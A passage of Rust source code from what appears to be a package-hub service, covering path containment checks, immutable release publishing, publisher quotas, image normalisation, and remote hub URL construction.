            return Ok(authority);
        }
        let service = self.require_enabled()?;
        let now = now_ts();
        let authority = HubAuthority {
            authority_id: DEFAULT_HUB_SERVICE_INSTANCE_ID.to_string(),
            host_project_id: service.host_office_id,
            owner: HUB_SERVICE_SCOPE_OWNER.to_string(),
            project: HUB_SERVICE_SCOPE_PROJECT.to_string(),
            enabled: true,
            public_base_url: service.public_base_url,
            created_at: now,
            updated_at: now,
        };
        self.hub_data.put_hub_authority(&authority)?;
        Ok(authority)
    }

    fn hub_artifact_path(&self, rel_path: &str) -> Result<PathBuf, PlatformError> {
        let rel_path = rel_path.trim().replace('\\', "/");
        if rel_path.is_empty() || rel_path.contains('\0') {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path is invalid",
            ));
        }
        let rel = Path::new(&rel_path);
        if rel.is_absolute()
            || rel
                .components()
                .any(|component| !matches!(component, std::path::Component::Normal(_)))
        {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path must be a contained relative path",
            ));
        }
        let service_rel_prefix = format!("services/{DEFAULT_HUB_SERVICE_INSTANCE_ID}/");
        if !rel_path.starts_with(&service_rel_prefix) {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path must live under the hub service root",
            ));
        }
        let service_root = self
            .data_root
            .join("services")
            .join(DEFAULT_HUB_SERVICE_INSTANCE_ID);
        let abs = self.data_root.join(rel);
        let service_root = fs::canonicalize(&service_root)?;
        let abs = fs::canonicalize(&abs)?;
        if !abs.starts_with(&service_root) {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path escapes hub service root",
            ));
        }
        Ok(abs)
    }

    fn hub_artifact_path_for_delete(&self, rel_path: &str) -> Result<PathBuf, PlatformError> {
        let rel_path = rel_path.trim().replace('\\', "/");
        if rel_path.is_empty() || rel_path.contains('\0') {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path is invalid",
            ));
        }
        let rel = Path::new(&rel_path);
        if rel.is_absolute()
            || rel
                .components()
                .any(|component| !matches!(component, std::path::Component::Normal(_)))
        {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path must be a contained relative path",
            ));
        }
        let service_rel_prefix = format!("services/{DEFAULT_HUB_SERVICE_INSTANCE_ID}/");
        if !rel_path.starts_with(&service_rel_prefix) {
            return Err(PlatformError::new(
                "HUB_ARTIFACT_PATH_INVALID",
                "artifact path must live under the hub service root",
            ));
        }
        Ok(self.data_root.join(rel))
    }

    /// Refuse a publish that would overwrite an existing `package@version`.
    ///
    /// Releases are immutable: see the decision recorded in
    /// `docs/contracts/kinds/hub-package/README.md`. `zeb.lock` pins a version
    /// to a digest, and a digest only means something when the bytes it names
    /// cannot change underneath it — an overwritten release turns a republish
    /// into a tampered-dependency report in every project that pinned it.
    ///
    /// Every publish path calls this before it writes anything durable, so a
    /// refusal leaves the stored artifact, the version row, and its digest
    /// exactly as the first publish left them.
    fn enforce_release_immutability(
        &self,
        package_id: &str,
        version: &str,
    ) -> Result<(), PlatformError> {
        if self
            .hub_data
            .get_hub_asset_version(package_id, version)?
            .is_some()
        {
            return Err(PlatformError::new(
                "HUB_VERSION_EXISTS",
                format!(
                    "{package_id}@{version} is already published and releases are immutable; bump the version and publish again"
                ),
            ));
        }
        Ok(())
    }

    fn enforce_publisher_package_quota(
        &self,
        publisher: &HubPublisher,
        package_id: &str,
        existing_package: Option<&HubAssetPackage>,
        artifact_bytes: usize,
    ) -> Result<(), PlatformError> {
        let max_package_bytes = normalize_limit(
            publisher.max_package_bytes,
            DEFAULT_PUBLISHER_MAX_PACKAGE_BYTES,
        );
        let max_packages = normalize_limit(publisher.max_packages, DEFAULT_PUBLISHER_MAX_PACKAGES);
        if artifact_bytes as i64 > max_package_bytes {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_QUOTA_EXCEEDED",
                "publisher artifact byte limit exceeded",
            ));
        }
        if let Some(existing) = existing_package {
            if existing.publisher_id != publisher.publisher_id
                || existing.publisher_pk != publisher.publisher_pk
            {
                return Err(PlatformError::new(
                    "HUB_PACKAGE_FORBIDDEN",
                    "package id already belongs to another publisher",
                ));
            }
            return Ok(());
        }
        let package_count = self
            .hub_data
            .list_hub_asset_packages()?
            .into_iter()
            .filter(|item| {
                item.publisher_id == publisher.publisher_id
                    && item.publisher_pk == publisher.publisher_pk
            })
            .count() as i64;
        if package_count >= max_packages {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_QUOTA_EXCEEDED",
                "publisher package count limit exceeded",
            ));
        }
        if package_id.is_empty() {
            return Err(PlatformError::new(
                "HUB_PUBLISH_INVALID",
                "package id must not be empty",
            ));
        }
        Ok(())
    }
}

fn remote_hub_api_base(base_url: &str) -> String {
    base_url.trim().trim_end_matches('/').to_string()
}

fn is_direct_hub_base(base_url: &str) -> bool {
    let base = remote_hub_api_base(base_url).to_lowercase();
    is_legacy_project_hub_base(&base) || is_ownerless_hub_base(&base)
}

fn is_legacy_project_hub_base(base_url: &str) -> bool {
    let base = remote_hub_api_base(base_url).to_lowercase();
    base.contains("/api/projects/") && base.ends_with("/hub")
}

fn is_ownerless_hub_base(base_url: &str) -> bool {
    let base = remote_hub_api_base(base_url).to_lowercase();
    base.ends_with("/api") || base.ends_with("/api/hub")
}

fn ownerless_hub_url(api_base: &str, suffix: &str) -> String {
    if api_base.to_lowercase().ends_with("/api/hub") {
        format!("{}/{}", api_base, suffix)
    } else {
        format!("{}/hub/{}", api_base, suffix)
    }
}

fn remote_hub_url(repo: &ProjectHubRepository, suffix: &str) -> String {
    let api_base = remote_hub_api_base(&repo.base_url);
    let suffix = suffix.trim_start_matches('/');
    if is_legacy_project_hub_base(&api_base) {
        format!("{}/{}", api_base, suffix)
    } else if is_ownerless_hub_base(&api_base) {
        ownerless_hub_url(&api_base, suffix)
    } else {
        format!(
            "{}/projects/{}/{}/hub/{}",
            api_base, repo.remote_owner, repo.remote_project, suffix
        )
    }
}

fn remote_hub_url_for_platform(repo: &PlatformHubRepository, suffix: &str) -> String {
    let api_base = remote_hub_api_base(&repo.base_url);
    let suffix = suffix.trim_start_matches('/');
    if is_legacy_project_hub_base(&api_base) {
        format!("{}/{}", api_base, suffix)
    } else if is_ownerless_hub_base(&api_base) {
        ownerless_hub_url(&api_base, suffix)
    } else {
        format!(
            "{}/projects/{}/{}/hub/{}",
            api_base, repo.remote_owner, repo.remote_project, suffix
        )
    }
}

fn validate_remote_hub_url(url: &str) -> Result<(), PlatformError> {
    if hub_localhost_remote_allowed(url) {
        return Ok(());
    }
    crate::pipeline::security::validate_outbound_http_url(url, "hub.remote")
        .map_err(|err| PlatformError::new(err.code, err.message))
}

fn hub_localhost_remote_allowed(url: &str) -> bool {
    // Test/dev escape hatch for two local Zebflow instances. Production must
    // leave this unset so hub remotes follow the normal egress policy.
    if std::env::var("ZEBFLOW_HUB_ALLOW_LOCALHOST_REMOTE")
        .ok()
        .as_deref()
        != Some("1")
    {
        return false;
    }
    let Ok(parsed) = reqwest::Url::parse(url) else {
        return false;
    };
    matches!(
        parsed.host_str().unwrap_or(""),
        "localhost" | "127.0.0.1" | "::1"
    )
}

fn clear_repo_worktree_preserving_git(repo_dir: &Path) -> Result<(), PlatformError> {
    let entries =
        fs::read_dir(repo_dir).map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?;
    for entry in entries.flatten() {
        let path = entry.path();
        let keep = path
            .file_name()
            .and_then(|value| value.to_str())
            .map(|name| name == ".git")
            .unwrap_or(false);
        if keep {
            continue;
        }
        if path.is_dir() {
            fs::remove_dir_all(&path)
                .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?;
        } else {
            fs::remove_file(&path)
                .map_err(|err| PlatformError::new("HUB_INSTALL", err.to_string()))?;
        }
    }
    Ok(())
}

fn sanitize_install_repo_path(
    layout: &ProjectFileLayout,
    rel_path: &str,
) -> Result<PathBuf, PlatformError> {
    let cleaned = rel_path.trim_start_matches("./").trim_start_matches('/');
    let abs = layout.repo_dir.join(cleaned);
    if !abs.starts_with(&layout.repo_dir) {
        return Err(PlatformError::new(
            "HUB_INSTALL",
            "artifact path escaped repo root",
        ));
    }
    Ok(abs)
}

fn build_preview(
    asset_kind: String,
    source_type: String,
    source_ref: String,
    name: String,
    description: String,
    entries: Vec<HubPackageFile>,
    warnings: Vec<String>,
) -> HubExportPreview {
    let total_bytes = entries.iter().map(|item| item.size_bytes).sum();
    let total_files = entries.len();
    HubExportPreview {
        asset_kind,
        source_type,
        source_ref,
        name,
        description,
        entries,
        warnings,
        total_files,
        total_bytes,
    }
}

fn text_export_entry(rel_path: &str, kind: &str, reason: &str, content: String) -> HubPackageFile {
    HubPackageFile {
        rel_path: rel_path.to_string(),
        kind: kind.to_string(),
        size_bytes: content.len(),
        reason: reason.to_string(),
        encoding: "text".to_string(),
        content: Some(content),
        artifact: None,
    }
}

fn rewrite_project_libraries(
    preview: &mut HubExportPreview,
    selected_libraries: &[String],
) -> Result<(), PlatformError> {
    let Some(entry) = preview.entries.iter_mut().find(|entry| {
        normalize_repo_rel(&entry.rel_path) == crate::contracts::kinds::PROJECT_CONFIGURATION_FILE
    }) else {
        return Ok(());
    };
    let Some(raw) = entry_text(entry) else {
        return Err(PlatformError::new(
            "HUB_PUBLISH",
            "zebflow.yaml must be a text entry",
        ));
    };
    let mut document =
        crate::contracts::decode_contract_yaml::<ProjectConfigurationContract>(raw.as_bytes())
            .map_err(|err| {
                PlatformError::new("HUB_PUBLISH", format!("invalid zebflow.yaml: {err}"))
            })?;
    let cfg = &mut document.spec;
    let selected = selected_libraries.iter().cloned().collect::<BTreeSet<_>>();
    cfg.rwe.libraries.retain(|name, _| selected.contains(name));
    let content = String::from_utf8(
        crate::contracts::encode_contract_yaml::<ProjectConfigurationContract>(
            document.metadata,
            document.spec,
        )
        .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?,
    )
    .map_err(|err| PlatformError::new("HUB_PUBLISH", err.to_string()))?;
    entry.size_bytes = content.len();
    entry.encoding = "text".to_string();
    entry.content = Some(content);
    Ok(())
}

/// Reads the publisher's chosen image and normalises it to a WebP cover.
///
/// Nothing is stored: this is the half both the publish path and its dry-run
/// review share, so a review costs the same conversion and the same quota check
/// without writing anything.
fn hub_cover_webp_from_path(
    layout: &ProjectFileLayout,
    image_file_path: &str,
    publisher: &HubPublisher,
) -> Result<Option<(String, Vec<u8>)>, PlatformError> {
    let image_file_path = image_file_path.trim();
    if image_file_path.is_empty() {
        return Ok(None);
    }
    let rel = normalize_object_path(image_file_path)
        .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?;
    let zebfs = LocalZebFs::new(layout.files_dir.clone());
    let object = zebfs
        .get(&rel)
        .map_err(|err| PlatformError::new("HUB_MEDIA_MISSING", err.to_string()))?;
    image_content_type_from_path(&rel)?;
    let max_image_bytes =
        normalize_limit(publisher.max_image_bytes, DEFAULT_PUBLISHER_MAX_IMAGE_BYTES) as usize;
    let webp_bytes = normalize_hub_cover_to_webp(&object.bytes)?;
    if webp_bytes.len() > max_image_bytes {
        return Err(PlatformError::new(
            "HUB_PUBLISHER_QUOTA_EXCEEDED",
            "webp cover image exceeds publisher max image bytes",
        ));
    }
    Ok(Some((HUB_COVER_MEDIA_NAME.to_string(), webp_bytes)))
}

/// A review of what the cover would be, without storing it.
fn hub_cover_media_review(
    layout: &ProjectFileLayout,
    image_file_path: &str,
    publisher: &HubPublisher,
) -> Result<Vec<HubPublishMediaReview>, PlatformError> {
    let Some((name, bytes)) = hub_cover_webp_from_path(layout, image_file_path, publisher)? else {
        return Ok(Vec::new());
    };
    Ok(vec![HubPublishMediaReview {
        name,
        role: "cover".to_string(),
        content_type: HUB_COVER_MEDIA_TYPE.to_string(),
        size_bytes: bytes.len(),
    }])
}

/// Validates inbound presentation images and decodes them for storing.
///
/// The bytes are returned rather than kept: the caller puts them in the
/// content-addressed artifact store and records only the digest.
fn decode_remote_hub_media(
    media: &[RemoteHubPublishMedia],
    publisher: &HubPublisher,
) -> Result<Vec<(HubAssetMedia, Vec<u8>)>, PlatformError> {
    let max_media_files =
        normalize_limit(publisher.max_media_files, DEFAULT_PUBLISHER_MAX_MEDIA_FILES) as usize;
    if media.len() > max_media_files {
        return Err(PlatformError::new(
            "HUB_PUBLISHER_QUOTA_EXCEEDED",
            "media file count exceeds publisher limit",
        ));
    }
    let max_image_bytes =
        normalize_limit(publisher.max_image_bytes, DEFAULT_PUBLISHER_MAX_IMAGE_BYTES) as usize;
    let mut out = Vec::with_capacity(media.len());
    for item in media {
        let normalized_name = normalize_media_name(&item.name)?;
        if normalized_name != item.name {
            return Err(PlatformError::new(
                "HUB_MEDIA_INVALID",
                "media name is not normalized",
            ));
        }
        if item.encoding != "base64" {
            return Err(PlatformError::new(
                "HUB_MEDIA_INVALID",
                "media encoding must be base64",
            ));
        }
        validate_image_content_type(&item.content_type)?;
        if item.size_bytes > max_image_bytes {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_QUOTA_EXCEEDED",
                "image exceeds publisher max image bytes",
            ));
        }
        let bytes = base64::engine::general_purpose::STANDARD
            .decode(&item.content)
            .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?;
        if bytes.len() != item.size_bytes || sha256_hex(&bytes) != item.sha256 {
            return Err(PlatformError::new(
                "HUB_MEDIA_INVALID",
                "media size or hash does not match content",
            ));
        }
        if bytes.len() > max_image_bytes {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_QUOTA_EXCEEDED",
                "image exceeds publisher max image bytes",
            ));
        }
        out.push((
            HubAssetMedia {
                name: item.name.clone(),
                role: item.role.clone(),
                content_type: item.content_type.clone(),
                size_bytes: bytes.len(),
                artifact_sha256: sha256_hex(&bytes),
            },
            bytes,
        ));
    }
    Ok(out)
}

fn validate_hub_gallery(
    gallery: &HubAssetGallery,
    media: &[HubAssetMedia],
) -> Result<(), PlatformError> {
    let media_names = media
        .iter()
        .map(|item| item.name.as_str())
        .collect::<BTreeSet<_>>();
    if let Some(cover) = &gallery.cover {
        if cover.kind.trim() != "image" {
            return Err(PlatformError::new(
                "HUB_GALLERY_INVALID",
                "gallery cover kind must be image",
            ));
        }
        validate_gallery_media_ref(&cover.media_name, &media_names)?;
    }
    for item in &gallery.items {
        match item.kind.trim() {
            "image" => validate_gallery_media_ref(&item.media_name, &media_names)?,
            "youtube" => validate_youtube_url(&item.url)?,
            _ => {
                return Err(PlatformError::new(
                    "HUB_GALLERY_INVALID",
                    "gallery item kind must be image or youtube",
                ));
            }
        }
    }
    Ok(())
}

#[allow(clippy::too_many_arguments)]
fn review_publish_artifact(
    package_id: String,
    version: String,
    preview: HubExportPreview,
    title: String,
    description: String,
    visibility: String,
    tags: Vec<String>,
    media: Vec<HubPublishMediaReview>,
    project_initialization: HubPackageInitialization,
    artifacts: &HubArtifactChannel,
) -> Result<HubPublishReview, PlatformError> {
    let policy_entries = preview
        .entries
        .iter()
        .map(|entry| package_policy_entry(&entry.rel_path, entry, artifacts))
        .collect::<Vec<_>>();
    let policy = review_package_entries(
        &policy_entries,
        preview.warnings.clone(),
        PackageReviewOptions {
            publish_mode: true,
            require_title: true,
            require_description: true,
            require_cover_image: true,
            title: title.clone(),
            description: description.clone(),
            has_cover_image: !media.is_empty(),
        },
    );

    Ok(HubPublishReview {
        package_id,
        version,
        asset_kind: preview.asset_kind.clone(),
        source_type: preview.source_type.clone(),
        source_ref: preview.source_ref.clone(),
        title,
        description,
        visibility,
        tags,
        total_files: preview.total_files,
        total_bytes: preview.total_bytes,
        files: preview.entries.clone(),
        media,
        nodes_used: policy.nodes_used,
        credentials_required: policy.credentials_required,
        external_urls: policy.external_urls,
        database_effects: policy.database_effects,
        filesystem_effects: policy.filesystem_effects,
        public_endpoints: policy.public_endpoints,
        schedules: policy.schedules,
        large_files: policy.large_files,
        seed_data: policy.seed_data,
        project_initialization: serde_json::to_value(project_initialization)
            .map_err(|err| PlatformError::new("HUB_PUBLISH_REVIEW", err.to_string()))?,
        warnings: policy.warnings,
        violations: policy.violations,
        risk_level: policy.risk_level,
    })
}

fn normalize_hub_cover_to_webp(bytes: &[u8]) -> Result<Vec<u8>, PlatformError> {
    const MAX_DIM: u32 = 8000;
    const MAX_DECODED_BYTES: u64 = 128 * 1024 * 1024;
    let (w, h) = image::ImageReader::new(Cursor::new(bytes))
        .with_guessed_format()
        .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?
        .into_dimensions()
        .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?;
    if w == 0 || h == 0 || w > MAX_DIM || h > MAX_DIM {
        return Err(PlatformError::new(
            "HUB_MEDIA_INVALID",
            "cover image dimensions are invalid or too large",
        ));
    }
    if (w as u64) * (h as u64) * 4 > MAX_DECODED_BYTES {
        return Err(PlatformError::new(
            "HUB_MEDIA_INVALID",
            "cover image decoded size is too large",
        ));
    }
    let image = image::ImageReader::new(Cursor::new(bytes))
        .with_guessed_format()
        .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?
        .decode()
        .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?;
    let image = fit_hub_cover(image, 1200, 675);
    let mut out = Vec::new();
    image
        .write_to(&mut Cursor::new(&mut out), ImageFormat::WebP)
        .map_err(|err| PlatformError::new("HUB_MEDIA_INVALID", err.to_string()))?;
    Ok(out)
}

fn fit_hub_cover(img: DynamicImage, max_w: u32, max_h: u32) -> DynamicImage {
    let (w, h) = img.dimensions();
    if w <= max_w && h <= max_h {
        return img;
    }
    img.resize(max_w, max_h, FilterType::Lanczos3)
}

fn validate_gallery_media_ref(
    media_name: &str,
    media_names: &BTreeSet<&str>,
) -> Result<(), PlatformError> {
    let normalized = normalize_media_name(media_name)?;
    if normalized != media_name {
        return Err(PlatformError::new(
            "HUB_GALLERY_INVALID",
            "gallery media name is not normalized",
        ));
    }
    if !media_names.contains(media_name) {
        return Err(PlatformError::new(
            "HUB_GALLERY_INVALID",
            "gallery image must reference an existing media item",
        ));
    }
    Ok(())
}

fn validate_youtube_url(input: &str) -> Result<(), PlatformError> {
    let url = reqwest::Url::parse(input.trim()).map_err(|_| {
        PlatformError::new("HUB_GALLERY_INVALID", "youtube URL must be a valid URL")
    })?;
    if url.scheme() != "https" {
        return Err(PlatformError::new(
            "HUB_GALLERY_INVALID",
            "youtube URL must use https",
        ));
    }
    let host = url.host_str().unwrap_or_default().to_ascii_lowercase();
    let ok_host = matches!(
        host.as_str(),
        "youtube.com" | "www.youtube.com" | "youtu.be" | "m.youtube.com"
    );
    if !ok_host {
        return Err(PlatformError::new(
            "HUB_GALLERY_INVALID",
            "gallery video URL must be a YouTube URL",
        ));
    }
    Ok(())
}

fn normalize_media_name(input: &str) -> Result<String, PlatformError> {
    let value = input.trim();
    if value.is_empty()
        || value.contains('/')
        || value.contains('\\')
        || value.contains('\0')
        || value == "."
        || value == ".."
    {
        return Err(PlatformError::new(
            "HUB_MEDIA_INVALID",
            "media name must be a plain file name",
        ));
    }
    Ok(value.to_string())
}

fn image_content_type_from_path(path: &str) -> Result<String, PlatformError> {
    let ext = Path::new(path)
        .extension()
        .and_then(|value| value.to_str())
        .unwrap_or_default()
        .to_ascii_lowercase();
    let content_type = match ext.as_str() {
        "png" => "image/png",
        "jpg" | "jpeg" => "image/jpeg",
        "webp" => "image/webp",
        "gif" => "image/gif",
        _ => {
            return Err(PlatformError::new(
                "HUB_MEDIA_INVALID",
                "package image must be png, jpg, webp, or gif",
            ));
        }
    };
    Ok(content_type.to_string())
}

fn normalize_hub_id_segment(raw: &str, label: &str) -> Result<String, PlatformError> {
    let mut out = String::new();
    let mut last_dash = false;
    for c in raw.trim().to_ascii_lowercase().chars() {
        if c.is_ascii_alphanumeric() {
            out.push(c);
            last_dash = false;
        } else if c == '-' || c == '_' || c.is_ascii_whitespace() {
            if !last_dash && !out.is_empty() {
                out.push('-');
                last_dash = true;
            }
        } else if !last_dash && !out.is_empty() {
            out.push('-');
            last_dash = true;
        }
    }
    let value = out.trim_matches('-').to_string();
    if value.is_empty() {
        return Err(PlatformError::new(
            "HUB_ID_INVALID",
            format!("{label} must contain at least one alphanumeric character"),
        ));
    }
    Ok(value)
}

fn canonical_hub_package_id(
    publisher_id: &str,
    raw_package_id: &str,
) -> Result<String, PlatformError> {
    let publisher = normalize_hub_id_segment(publisher_id, "publisher id")?;
    let trimmed = raw_package_id.trim();
    let asset_raw = if let Some((prefix, rest)) = trimmed.split_once('.') {
        let normalized_prefix = normalize_hub_id_segment(prefix, "package publisher prefix")?;
        if normalized_prefix != publisher {
            return Err(PlatformError::new(
                "HUB_PACKAGE_ID_INVALID",
                "package id must use the selected publisher prefix",
            ));
        }
        rest
    } else {
        trimmed
    };
    let asset = normalize_hub_id_segment(asset_raw, "asset slug")?;
    Ok(format!("{publisher}.{asset}"))
}

fn validate_image_content_type(content_type: &str) -> Result<(), PlatformError> {
    match content_type.trim().to_ascii_lowercase().as_str() {
        "image/png" | "image/jpeg" | "image/webp" | "image/gif" => Ok(()),
        _ => Err(PlatformError::new(
            "HUB_MEDIA_INVALID",
            "media content type is not an allowed image type",
        )),
    }
}

fn normalize_visibility(input: &str) -> String {
    match input.trim().to_ascii_lowercase().as_str() {
        "public" => "public".to_string(),
        "unlisted" => "unlisted".to_string(),
        _ => "private".to_string(),
    }
}

fn normalize_scopes(input: &[String]) -> Vec<String> {
    let mut out = input
        .iter()
        .map(|item| item.trim().to_ascii_lowercase())
        .filter(|item| matches!(item.as_str(), "hub:read" | "hub:publish" | "hub:manage"))
        .collect::<Vec<_>>();
    out.sort();
    out.dedup();
    out
}

fn validate_publisher_scopes(
    publisher: &HubPublisher,
    scopes: &[String],
) -> Result<(), PlatformError> {
    for scope in scopes {
        let allowed = match scope.as_str() {
            "hub:read" => publisher.can_read,
            "hub:publish" => publisher.can_publish,
            "hub:manage" => publisher.can_manage,
            _ => false,
        };
        if !allowed {
            return Err(PlatformError::new(
                "HUB_PUBLISHER_SCOPE_DENIED",
                "publisher is not allowed to create a token with the requested scope",
            ));
        }
    }
    Ok(())
}

fn apply_scope_flags(mut token: HubToken) -> HubToken {
    token.scope_read = token.scopes.iter().any(|scope| scope == "hub:read");
    token.scope_publish = token.scopes.iter().any(|scope| scope == "hub:publish");
    token.scope_manage = token.scopes.iter().any(|scope| scope == "hub:manage");
    token
}

fn normalize_publisher_url(publisher_id: &str, explicit: &str) -> String {
    let trimmed = explicit.trim();
    if !trimmed.is_empty() {
        trimmed.to_string()
    } else if publisher_id.is_empty() {
        String::new()
    } else {
        format!("/publishers/{publisher_id}")
    }
}

fn normalize_source_type(input: &str) -> String {
    match input.trim() {
        "template_with_dependencies" => "template_with_dependencies".to_string(),
        "folder_files" => "folder_files".to_string(),
        "project_files" => "project_files".to_string(),
        _ => "pipeline_with_dependencies".to_string(),
    }
}

fn validate_hub_asset_kind(input: &str) -> Result<String, PlatformError> {
    let value = input.trim();
    if HUB_ASSET_KINDS.contains(&value) {
        Ok(value.to_string())
    } else {
        Err(PlatformError::new(
            "HUB_ASSET_KIND_INVALID",
            format!("asset kind must be one of: {}", HUB_ASSET_KINDS.join(", ")),
        ))
    }
}

fn normalize_platform_source_visibility(input: &str) -> String {
    match input.trim().to_ascii_lowercase().as_str() {
        "private" => "private".to_string(),
        _ => "public".to_string(),
    }
}

fn normalize_hub_grant_scope(input: &str) -> Result<String, PlatformError> {
    match input.trim() {
        "all_projects" => Ok("all_projects".to_string()),
        "selected_project" => Ok("selected_project".to_string()),
        _ => Err(PlatformError::new(
            "HUB_ACCESS_GRANT_INVALID",
            "grant_scope must be all_projects or selected_project",
        )),
    }
}

fn normalize_limit(value: i64, default_value: i64) -> i64 {
    if value <= 0 { default_value } else { value }
}

fn validate_hub_version(version: &str) -> Result<(), PlatformError> {
    let valid = !version.is_empty()
        && version.len() <= 80
        && version
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || matches!(byte, b'.' | b'-' | b'_'))
        && !version.contains("..");
    if valid {
        Ok(())
    } else {
        Err(PlatformError::new(
            "HUB_PUBLISH_INVALID",
            "version must be a safe path segment",
        ))
    }
}

fn random_hex(bytes: usize) -> String {
    let mut data = vec![0u8; bytes];
    rand::rng().fill(data.as_mut_slice());
    data.into_iter()
        .map(|b| format!("{b:02x}"))
        .collect::<String>()
}

fn sha256_hex(input: &[u8]) -> String {
    let mut hasher = Sha256::new();
    hasher.update(input);
    let bytes = hasher.finalize();
    bytes.iter().map(|b| format!("{b:02x}")).collect()
}

fn normalize_repo_rel(input: &str) -> String {
    let trimmed = input
        .trim()
        .trim_start_matches("./")
        .trim_start_matches('/');
    trimmed.replace('\\', "/")
}

fn normalize_template_repo_rel(input: &str) -> String {
    let rel = normalize_repo_rel(input);
    if rel.is_empty() {
        rel
    } else if rel.starts_with("pipelines/") {
        rel
    } else {
        format!("pipelines/{rel}")
    }
}

fn read_repo_entry(
    layout: &ProjectFileLayout,
    rel_path: &str,
    reason: String,
) -> Result<HubPackageFile, PlatformError> {
    let rel_path = normalize_repo_rel(rel_path);
    let abs = layout.repo_dir.join(&rel_path);
    if !abs.starts_with(&layout.repo_dir) || !abs.is_file() {
        return Err(PlatformError::new(
            "HUB_ENTRY_MISSING",
            format!("file '{}' not found", rel_path),
        ));
    }
    let bytes = fs::read(&abs)?;
    let size_bytes = bytes.len();
    let (encoding, content) = match String::from_utf8(bytes.clone()) {
        Ok(text) => ("text".to_string(), text),
        Err(_) => (
            "base64".to_string(),
            base64::engine::general_purpose::STANDARD.encode(bytes),
        ),
    };
    Ok(HubPackageFile {
        rel_path,
        kind: file_kind_from_path(&abs),
        size_bytes,
        reason,
        encoding,
        content: Some(content),
        artifact: None,
    })
}

fn list_repo_folders(layout: &ProjectFileLayout) -> Result<Vec<String>, PlatformError> {
    let mut out = Vec::new();
    walk_dirs(&layout.repo_dir, &layout.repo_dir, &mut out)?;
    out.sort();
    Ok(out)
}

fn walk_dirs(root: &Path, current: &Path, out: &mut Vec<String>) -> Result<(), PlatformError> {
    let mut entries = fs::read_dir(current)?.collect::<Result<Vec<_>, _>>()?;
    entries.sort_by_key(|item| item.path());
    for entry in entries {
        let path = entry.path();
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if name.starts_with(".git") {
            continue;
        }
        if path.is_dir() {
            if let Ok(rel) = path.strip_prefix(root) {
                let rel = rel.to_string_lossy().replace('\\', "/");
                if !rel.is_empty() {
                    out.push(rel);
                }
            }
            walk_dirs(root, &path, out)?;
        }
    }
    Ok(())
}

fn collect_tree_entries(
    layout: &ProjectFileLayout,
    rel_root: &str,
) -> Result<Vec<HubPackageFile>, PlatformError> {
    let rel_root = normalize_repo_rel(rel_root);
    let base = if rel_root.is_empty() || rel_root == "." {
        layout.repo_dir.clone()
    } else {
        layout.repo_dir.join(&rel_root)
    };
    if !base.starts_with(&layout.repo_dir) || !base.exists() {
        return Err(PlatformError::new(
            "HUB_SOURCE_INVALID",
            format!("path '{}' not found", rel_root),
        ));
    }
    let mut files = Vec::new();
    walk_files(&layout.repo_dir, &base, &mut files)?;
    Ok(files
        .into_iter()
        .map(|item| read_repo_entry(layout, &item, "included file".to_string()))
        .collect::<Result<Vec<_>, _>>()?)
}

fn walk_files(root: &Path, current: &Path, out: &mut Vec<String>) -> Result<(), PlatformError> {
    if current.is_file() {
        let rel = current
            .strip_prefix(root)
            .map_err(|_| PlatformError::new("HUB_SOURCE_INVALID", "path escaped repo root"))?;
        out.push(rel.to_string_lossy().replace('\\', "/"));
        return Ok(());
    }
    let mut entries = fs::read_dir(current)?.collect::<Result<Vec<_>, _>>()?;
    entries.sort_by_key(|item| item.path());
    for entry in entries {
        let path = entry.path();
        let name = entry.file_name();
        let name = name.to_string_lossy();
        if name == ".git" {
            continue;
        }
        if path.is_dir() {
            walk_files(root, &path, out)?;
        } else if path.is_file() {
            let rel = path
                .strip_prefix(root)
                .map_err(|_| PlatformError::new("HUB_SOURCE_INVALID", "path escaped repo root"))?;
            out.push(rel.to_string_lossy().replace('\\', "/"));
        }
    }
    Ok(())
}

fn resolve_local_import(
    layout: &ProjectFileLayout,
    from_rel: &str,
    import_src: &str,
) -> Option<String> {
    let candidates = if let Some(rest) = import_src.strip_prefix("@/") {
        candidate_paths(rest)
    } else if import_src.starts_with('.') {
        let parent = Path::new(from_rel)
            .parent()
            .unwrap_or_else(|| Path::new(""));
        let joined = parent.join(import_src);
        let rel = joined.to_string_lossy().replace('\\', "/");
        candidate_paths(&rel)
    } else {
        return None;
    };
    for rel in candidates {
        let rel = normalize_repo_rel(&rel);
        let abs = layout
            .repo_pipelines_dir
            .join(rel.strip_prefix("pipelines/").unwrap_or(rel.as_str()));
        if abs.is_file() {
            return Some(normalize_template_repo_rel(&rel));
        }
        let repo_abs = layout.repo_dir.join(&rel);
        if repo_abs.is_file() {
            return Some(rel);
        }
    }
    None
}

fn candidate_paths(base: &str) -> Vec<String> {
    let base = normalize_repo_rel(base);
    let mut out = vec![base.clone()];
    if Path::new(&base).extension().is_none() {
        for ext in [".tsx", ".ts", ".jsx", ".js", ".css", ".sql", ".json"] {
            out.push(format!("{base}{ext}"));
        }
        for ext in [
            "index.tsx",
            "index.ts",
            "index.jsx",
            "index.js",
            "index.css",
        ] {
            out.push(format!("{base}/{ext}"));
        }
    }
    out
}

fn file_kind_from_path(path: &Path) -> String {
    match path
        .extension()
        .and_then(|ext| ext.to_str())
        .unwrap_or_default()
    {
        "tsx" => "tsx".to_string(),
        "ts" => "ts".to_string(),
        "js" => "js".to_string(),
